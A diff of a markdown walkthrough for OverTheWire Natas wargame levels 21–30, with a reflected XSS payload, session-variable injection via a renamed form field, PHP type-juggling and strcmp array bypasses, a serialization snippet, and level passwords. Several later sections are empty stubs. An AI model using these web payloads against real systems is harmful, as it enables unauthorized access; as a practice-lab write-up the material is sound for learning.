@@ -954,14 +954,82 @@ Password: BPhv63cKE1lkQl04cE5CuFTzXe15NfiH
 #### Natas 21 Solution
 
 ___
-**URL :** <http://natas17.natas.labs.overthewire.org/> \
-**Credentials :** *natas17:EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC*
+**URL :** <http://natas21.natas.labs.overthewire.org/> \
+**Credentials :** *natas21:BPhv63cKE1lkQl04cE5CuFTzXe15NfiH*
 
+We're told this level is co-located with another website:
+![Index file](/assets/images/21-1.png)
+
+This is what's on the other website:
+![Index file](/assets/images/21-2.png)
+
+First, I tried playing around with the website. After changing the bgcolor to red, I noticed the html changed which meant there could be a reflective XSS vulnerability:
+```html
+<form action="index.php" method="POST">
+    align: 
+    <input name='align' value='center'/>
+    <br>
+    fontsize: 
+    <input name='fontsize' value='100%'/>
+    <br>
+    bgcolor: 
+    <input name='bgcolor' value='red'/>
+    <br>
+    <input type="submit" name="submit" value="Update"/>
+</form>
+```
+I then tried the following payload:
+```html
+red'> <img src=x onerror=alert(1) alt='hi
+```
+which confirmed there was an reflective XSS vulnerability:
+
+![Index file](/assets/images/21-3.png)
+
+Unfortunately, after playing around with various XSS payloads, I couldn't do much. I then looked at the source code for the condition, which again required
+```php
+$_SESSION["admin"] = 1
+```
+I noticed something interesting. The server would create a new key value pair for every data that it is sent:
+```php
+$form .= '<form action="index.php" method="POST">';
+foreach($validkeys as $key => $defval) {
+    $val = $defval;
+    if (array_key_exists($key, $_SESSION)) {
+        $val = $_SESSION[$key];
+    } else {
+        $_SESSION[$key] = $val;
+    }
+    $form .= "$key: <input name='$key' value='$val' /><br>";
+}
+```
+So all I needed to was send a request with "admin": 1 in its body! This wasn't hard because there was nothing stopping from modifying the input name:
+```html
+<form action="index.php" method="POST">
+    align: 
+    <input name='align' value='center'/>
+    <br>
+    fontsize: 
+    <input name='fontsize' value='100%'/>
+    <br>
+    bgcolor: 
+    <input name='admin' value=1/>
+    <br>
+    <input type="submit" name="submit" value="Update"/>
+</form>
+```
+
+The last thing I needed to do was change the PHPSESSID of the original website to match the PHPSESSID of the second website, which gave me the password:
+
+![Index file](/assets/images/21-4.png)
 
 #### Natas 22 Solution
 
 ___
+**URL :** <http://natas22.natas.labs.overthewire.org/> \
+**Credentials :** *natas22:d8rwGBl0Xslg3b76uh3fEbSlnOUBlozz*
 
+We're only given the following source code:
 ```php
 <?php
 session_start();
@@ -984,11 +1052,32 @@ if (array_key_exists("revelio", $_GET)) {
 }
 ?>
 ```
+Analysing the source code, it seemed like all I needed to do was pass in revelio as a query parameter. Unfortunately, I get a blank page and my url didn't change for some reason:
 
-```curl -u natas22:d8rwGBl0Xslg3b76uh3fEbSlnOUBlozz 'http://natas22.natas.labs.overthewire.org/index.php?revelio'```
+![Index file](/assets/images/22-1.png)
+
+Analysing the network request further, it seems I was redirected to '/':
+
+![Index file](/assets/images/22-2.png)
+
+So I then wondered if I made a curl request would it be any different? I used the following payload:
+```bash
+curl -u natas22:d8rwGBl0Xslg3b76uh3fEbSlnOUBlozz 'http://natas22.natas.labs.overthewire.org/index.php?revelio'
+```
+It worked!
+```html
+You are an admin. The credentials for the next level are:<br><pre>Username: natas23
+Password: dIUQcI3uSus1JEOSSWRAEXBG8KbR8tRs</pre>
+```
+It seems like browsers automatically follow all redirects.
 
 #### Natas 23 Solution
 
+___
+**URL :** <http://natas23.natas.labs.overthewire.org/> \
+**Credentials :** *natas23:dIUQcI3uSus1JEOSSWRAEXBG8KbR8tRs*
+
+We're given the following source code:
 ```php
 <?php
 if (array_key_exists("passwd",$_REQUEST)) {
@@ -1001,26 +1090,71 @@ if (array_key_exists("passwd",$_REQUEST)) {
 }
 ?>
 ```
-Had to search up what strstr did
-Tried xxiloveyouxx
-Assumed the input had to be > 10 characters in length
-15iloveyou
+I first had to search up what strstr() did. All it did was check if a string contained a particular substring, in our case "iloveyou". The condition seemed simple, pass in a string longer than 10 characters with "iloveyou" as a substring. So I tried doing that:
 
+![Index file](/assets/images/23-1.png)
+
+Unfortunately, that did not work. After re-reading the source code, I realised it wasn't actually checking the length of the string, but the actual value of the string. Passing in a number larger than 10 doesn't work, since it will fail the first condition:
+
+![Index file](/assets/images/23-2.png)
+
+I then wondered if something like the following would work:
+```html
+15iloveyou
+```
+
+![Index file](/assets/images/23-3.png)
+
+It appears the way PHP compares a string and number is it will take as many leading characters of the string that form a valid number and ignore the rest which is why our payload worked (15 > 10). This is why strict comparison (===) is important! 
 
 #### Natas 24 Solution
 
 ___
-**URL :** <http://natas17.natas.labs.overthewire.org/> \
-**Credentials :** *natas17:EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC*
+**URL :** <http://natas24.natas.labs.overthewire.org/> \
+**Credentials :** *natas24:*
+
+We're only given the following source code:
+```php
+<?php
+if (array_key_exists("passwd",$_REQUEST)) {
+    if (!strcmp($_REQUEST["passwd"],"<censored>")) {
+        echo "<br>The credentials for the next level are:<br>";
+        echo "<pre>Username: natas25 Password: <censored></pre>";
+    } else{
+        echo "<br>Wrong!<br>";
+    }
+}
+?>
+```
+Unfortunately, there wasn't much to work with. Guessing the password was not a viable option. The only useful thing here was the strcmp() function, so I started looking for vulnerabilities with this in-built PHP function. After reading through the strcmp() documentation, I found a comment that said strcmp() can behave unexpectedly if both of its arguments aren't strings: 
+
+![Index file](/assets/images/24-1.png)
+
+So I tried passing in NULL which didn't work as I think its being processed as a string "NULL":
+
+![Index file](/assets/images/24-2.png)
+
+I then tried changing how 'passwd' was being seen by the server by modifying the inputs name to passwd[]. If you look at the network request, it should now be seen as an array instead of a string:
+
+![Index file](/assets/images/24-3.png)
+
+Just like the comment had mentioned, this produces unexpected behaviour and gives us the password:
+
+![Index file](/assets/images/24-4.png)
 
 #### Natas 25 Solution
 
 ___
-**URL :** <http://natas17.natas.labs.overthewire.org/> \
-**Credentials :** *natas17:EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC*
+**URL :** <http://natas25.natas.labs.overthewire.org/> \
+**Credentials :** *natas25:ckELKUWZUfpOv6uxS6M7lXBpBssJZ4Ws*
 
 
 #### Natas 26 Solution
+
+___
+**URL :** <http://natas26.natas.labs.overthewire.org/> \
+**Credentials :** *natas26:*
+
 ```php
 class Logger{
     private $logFile;
@@ -1035,3 +1169,28 @@ class Logger{
 $logger = new Logger();
 echo base64_encode(serialize($logger));
 ```
+
+#### Natas 27 Solution
+
+___
+**URL :** <http://natas27.natas.labs.overthewire.org/> \
+**Credentials :** *natas27:*
+
+
+#### Natas 28 Solution
+
+___
+**URL :** <http://natas28.natas.labs.overthewire.org/> \
+**Credentials :** *natas28:*
+
+#### Natas 29 Solution
+
+___
+**URL :** <http://natas29.natas.labs.overthewire.org/> \
+**Credentials :** *natas29:*
+
+#### Natas 26 Solution
+
+___
+**URL :** <http://natas30.natas.labs.overthewire.org/> \
+**Credentials :** *natas30:*
